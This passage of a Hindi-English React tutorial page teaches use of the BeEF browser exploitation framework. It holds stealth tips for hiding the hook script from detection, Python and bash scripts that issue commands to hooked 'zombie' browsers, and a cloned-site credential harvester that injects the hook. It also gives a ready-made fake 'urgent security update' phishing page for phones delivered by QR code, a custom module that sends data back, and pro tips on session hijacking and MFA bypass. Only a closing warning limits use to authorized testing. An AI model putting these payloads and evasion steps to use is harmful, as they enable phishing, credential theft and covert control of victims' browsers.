          { q: 'XSS vulnerability ज़रूरी है?', a: 'BeEF hook inject करने के लिए XSS सबसे common method है। लेकिन MITM, phishing, evil twin WiFi, या physical access से भी inject कर सकते हो।' },
          { q: 'HTTPS sites पर काम करता है?', a: 'Mixed content block होता है। BeEF को HTTPS setup करना होगा। या MITM proxy (Bettercap) से SSL stripping करके inject करो।' },
          { q: 'Mobile browsers पर काम करता है?', a: 'हाँ! Mobile browsers भी hook होते हैं। Limited modules available हैं लेकिन fingerprinting, keylogger, redirect सब काम करते हैं।' },
          { q: 'BeEF detect कैसे करें?', a: 'Network monitoring से hook.js requests detect करो। Browser extensions (NoScript) unauthorized scripts block करते हैं। CSP headers implement करो। SIEM alerts set करो।' },
          { q: 'क्या BeEF persistent है?', a: 'Browser refresh/close पर hook lose हो जाता है। लेकिन persistence modules (popunder, web worker, service worker) से hook maintain कर सकते हो। Cookie persistence भी possible है।' },
          { q: '300+ modules में से कौन से सबसे useful हैं?', a: 'Get Fingerprint, Keylogger, Pretty Theft (fake login), Get Internal IP, Port Scanner, Create Popunder — ये सबसे ज़्यादा use होते हैं red team operations में।' },
          { q: 'BeEF production environment में detect हो सकता है?', a: 'हाँ — CSP headers, WAF, network monitoring, browser extensions सब detect कर सकते हैं। इसलिए BeEF red team/social engineering testing के लिए best है, persistent APT के लिए नहीं।' },
          { q: 'BeEF कितने browsers simultaneously handle कर सकता है?', a: 'Server resources पर depend करता है। 4GB RAM वाली machine पर 50-100 zombies comfortably manage होते हैं। 100+ zombies के लिए performance tuning ज़रूरी है — debug mode off, threaded mode on, reverse proxy setup।' },
          { q: 'क्या BeEF से WiFi password steal कर सकते हो?', a: 'नहीं, BeEF browser-level access देता है system-level नहीं। WiFi passwords OS-level data हैं। लेकिन saved WiFi networks का SSID list मिल सकता है कुछ browsers में। System access के लिए Metasploit या OS-level exploit चाहिए।' },
          { q: 'BeEF hook Internet Explorer पर काम करता है?', a: 'हाँ, IE 11 और Edge legacy पर भी काम करता है। लेकिन IE में कुछ modules limited हैं — WebRTC, Service Workers, Web Workers support नहीं है। Modern browsers (Chrome, Firefox, Edge Chromium) में सबसे ज़्यादा modules काम करते हैं।' },
          { q: 'BeEF hook कितने time तक active रहता है?', a: 'Without persistence: page close = hook gone। With persistence modules: minutes से hours तक। Popunder + Web Worker combination से काफी देर तक hook maintain रहता है। Service Worker persistence से सबसे ज़्यादा time तक active रह सकता है।' },
          { q: 'BeEF को stealth mode में कैसे चलाएं?', a: 'hook.js URL obfuscate करो — shortener use करो या legitimate path पर host करो। CSP headers bypass करो MITM से। HTTPS setup करो mixed content avoid करने के लिए। Network traffic encrypt करो SSL/TLS से। IDS signatures avoid करने के लिए hook.js rename करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>BeEF Scripting and Automation</h2>
      <p>
        BeEF की REST API से automated attack scripts बना सकते हो। Python या bash scripts से BeEF control करना Red Team operations में बहुत useful है। Automated reconnaissance, bulk command execution, और report generation सब API से possible है।
      </p>
      <CodeBlock
        title="Python BeEF Automation Script"
        code={`#!/usr/bin/env python3
import requests

class BeefClient:
    def __init__(self, host, port, user, passwd):
        self.base_url = f"http://{host}:{port}"
        self.token = self.login(user, passwd)

    def login(self, user, passwd):
        r = requests.post(f"{self.base_url}/api/admin/login",
            json={"username": user, "password": passwd})
        return r.json()["token"]

    def get_hooks(self):
        headers = {"Authorization": f"Bearer {self.token}"}
        r = requests.get(f"{self.base_url}/api/hooks", headers=headers)
        return r.json()

    def execute_command(self, zombie_id, module):
        headers = {"Authorization": f"{self.token}"}
        r = requests.post(
            f"{self.base_url}/api/hooks/{zombie_id}/commands/{module}",
            headers=headers)
        return r.json()

beef = BeefClient("127.0.0.1", 3000, "beef", "beef")
zombies = beef.get_hooks()
print(f"Hooked browsers: {len(zombies)}")
for zombie in zombies:
    zid = zombie["id"]
    result = beef.execute_command(zid, 12)
    print(f"Zombie {zid} fingerprint collected")`}
      />
      <CodeBlock
        title="Bash Automation Script"
        code={`#!/bin/bash
BEEF_HOST="192.168.1.100"
BEEF_PORT="3000"

TOKEN=$(curl -s -X POST "http://$BEEF_HOST:$BEEF_PORT/api/admin/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"beef","password":"beef"}' | jq -r '.token')

HOOKS=$(curl -s "http://$BEEF_HOST:$BEEF_PORT/api/hooks" \
  -H "Authorization: Bearer $TOKEN" | jq 'length')

echo "[+] Total hooked browsers: $HOOKS"

for i in $(seq 1 $HOOKS); do
  echo "[*] Collecting fingerprint from zombie $i..."
  curl -s -X POST "http://$BEEF_HOST:$BEEF_PORT/api/hooks/$i/commands/12" \
    -H "Authorization: Bearer $TOKEN" | jq '.data'
done

echo "[+] Automation complete!"`}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        BeEF को दूसरे security tools के साथ combine करके powerful attack chains बना सकते हो। BeEF + Bettercap, BeEF + SET, BeEF + Nmap — ये combinations real-world penetration testing में बहुत effectively use होते हैं।
      </p>
      <CodeBlock
        title="BeEF + SET Integration"
        code={`# Social Engineering Toolkit (SET) + BeEF combo:

# Step 1: BeEF start करो
sudo beef-xss

# Step 2: SET start करो
sudo setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack
# 2) Site Cloner

# Step 3: Cloned page में hook.js inject करो
# /var/www/html/index.html में add करो:
# <script src="http://YOUR_IP:3000/hook.js"></script>

# अब victim cloned page पर आएगा:
# - Credentials SET में capture होंगे
# - Browser BeEF में hook होगा
# - Double attack: credentials + browser control`}
      />
      <CodeBlock
        title="BeEF + Nmap Recon Combo"
        code={`# Network recon + browser exploitation combo:

# Step 1: Nmap से network scan
nmap -sV -p 80,443 192.168.1.0/24 -oX network.xml

# Step 2: Web servers identify करो
grep "http" network.xml

# Step 3: XSS vulnerable pages ढूंढो
nikto -h http://192.168.1.50

# Step 4: BeEF hook inject करो vulnerable page पर
# <script src="http://ATTACKER:3000/hook.js"></script>

# Step 5: Browser से internal network scan
# BeEF dashboard - Network - Port Scanner
# Browser-based internal scan (firewall bypass)

# Step 6: Combined data compile करो
# Nmap: external network map
# BeEF: internal network map (from browser)`}
      />

      <h2>BeEF for Mobile Browser Testing</h2>
      <p>
        Mobile browsers भी BeEF से hook होते हैं। Mobile-specific attacks अलग होते हैं — touch events, mobile sensors, app WebView exploitation। Mobile security testing में BeEF बहुत useful है।
      </p>
      <CodeBlock
        title="Mobile Browser Exploitation"
        code={`# Mobile browsers hook करने के लिए:
# Same hook.js URL use करो — mobile browsers भी support करते हैं

# Mobile-specific modules:
# Commands - Host - Get Geolocation
# GPS location मिलता है (permission required)

# Commands - Host - Get Battery Status
# Battery level, charging status

# Commands - Browser - Get Touch Support
# Touch capability detect करो

# Mobile phishing page:
echo '<html>
<head>
  <meta name="viewport" content="width=device-width">
  <title>Mobile Update Required</title>
</head>
<body style="font-family:sans-serif;padding:20px">
  <h2>System Update</h2>
  <p>Your phone needs an urgent security update</p>
  <button onclick="update()">Update Now</button>
  <script src="http://YOUR_IP:3000/hook.js"></script>
</body>
</html>' > /var/www/html/mobile_update.html

# QR code से mobile hook delivery:
qrencode -o mobile_hook.png "http://YOUR_IP:3000/mobile_update.html"`}
      />

      <h2>BeEF Custom Module Development</h2>
      <p>
        BeEF में custom command modules बना सकते हो — Ruby और JavaScript में। Custom modules organization-specific attack scenarios के लिए बहुत useful हैं। Module structure simple है — module.rb (server-side) और command.js (client-side)।
      </p>
      <CodeBlock
        title="Custom Module Template"
        code={`# /usr/share/beef-xss/modules/custom/my_module/

# module.rb (server-side):
class My_module < BeEF::Core::Command
  def self.options
    [
      {'name' => 'target_url', 'ui_label' => 'Target URL', 'value' => 'http://target.com'},
      {'name' => 'timeout', 'ui_label' => 'Timeout (ms)', 'value' => '5000'}
    ]
  end

  def post_execute
    save({'result' => @datastore['result']})
  end
end

# command.js (client-side - runs in victim browser):
beef.execute(function() {
  var target = beef.net.urlEncode("<%= @target_url %>");

  // Custom code यहाँ:
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '<%= @target_url %>', true);
  xhr.timeout = parseInt('<%= @timeout %>');
  xhr.onload = function() {
    beef.net.send('<%= @command_url %>', <%= @command_id %>,
      'result=' + beef.net.urlEncode(xhr.responseText));
  };
  xhr.send();
});

# Module enable करो:
# config.yaml में module path add करो
# Dashboard पर Commands - Custom में दिखेगा`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Evilginx2</td><td className="py-2 px-3">Phishing proxy (AitM)</td><td className="py-2 px-3">2FA bypass, real-time phishing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SET</td><td className="py-2 px-3">Social Engineering Toolkit</td><td className="py-2 px-3">Multiple attack vectors, Metasploit</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">XSSer</td><td className="py-2 px-3">XSS automation framework</td><td className="py-2 px-3">XSS vulnerability scanner + exploitation</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">XSStrike</td><td className="py-2 px-3">XSS scanner</td><td className="py-2 px-3">Advanced XSS detection, WAF bypass</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Dalfox</td><td className="py-2 px-3">XSS scanner</td><td className="py-2 px-3">Fast, Go-based, parameter analysis</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Xenotix</td><td className="py-2 px-3">XSS exploitation</td><td className="py-2 px-3">500+ XSS payloads, iframe injection</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">OWASP ZAP</td><td className="py-2 px-3">Web app security testing</td><td className="py-2 px-3">XSS scanner + proxy + automation</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Burp Suite</td><td className="py-2 px-3">Web app security testing</td><td className="py-2 px-3">Professional XSS testing, intruder</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>BeEF का सबसे powerful feature social engineering है — fake login dialogs से credentials capture करना बहुत आसान है</li>
          <li>Bettercap/MITMf से combine करके network traffic में hook.js inject कर सकते हो बिना victim को कोई link भेजे</li>
          <li>HTTPS setup करो config.yaml में — mixed content issues solve होंगे</li>
          <li>REST API से automation scripts बनाओ — bulk operations के लिए</li>
          <li>Persistence modules (web worker, service worker) use करो — hook maintain रहेगा</li>
          <li>Custom modules बनाओ organization-specific needs के लिए</li>
          <li>BeEF + Metasploit combo browser exploits के लिए सबसे powerful है</li>
          <li>Mobile browsers भी target कर सकते हो — limited but effective modules</li>
          <li>Captive portal pages में hook.js embed करो — WiFi attacks में बहुत effective</li>
          <li>REST API से bulk operations automate करो — multiple zombies पर एक साथ commands</li>
          <li>BeEF + DNS spoofing combo network-wide injection के लिए use करो</li>
          <li>Browser pivot attack से victim के authenticated sessions hijack कर सकते हो</li>
          <li>Web Worker persistence से hook maintain रहता है even tab close पर</li>
          <li>Custom modules बनाओ organization-specific attack scenarios के लिए</li>
          <li>HTTPS setup करो config.yaml में — mixed content issues solve होंगे modern browsers में</li>
          <li>BeEF + Evilginx2 combo phishing attacks में MFA bypass कर सकता है</li>
          <li>hook.js को CDN path पर host करो — legitimate traffic जैसा दिखेगा</li>
          <li>Browser fingerprinting data collect करो unique zombies identify करने के लिए</li>
          <li>Popunder persistence technique use करो — background tab में hook maintain रहता है</li>
          <li>Network recon module से internal network topology map करो browser से</li>
          <li>CORS bypass techniques research करो cross-origin hook delivery के लिए</li>
          <li>BeEF logs को ELK stack में import करो — centralized logging और analysis</li>
          <li>Red team ops में hook delivery method rotate करो — detection avoid होगा</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> BeEF एक powerful browser exploitation framework है। इसका इस्तेमाल केवल authorized penetration testing और अपने lab environment में ही करें। बिना अनुमति के browser exploitation और credential theft अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized browser access अपराध हो सकता है। केवल authorized targets पर ही use करें।
      </div>
    </TutorialLayout>
  )
}
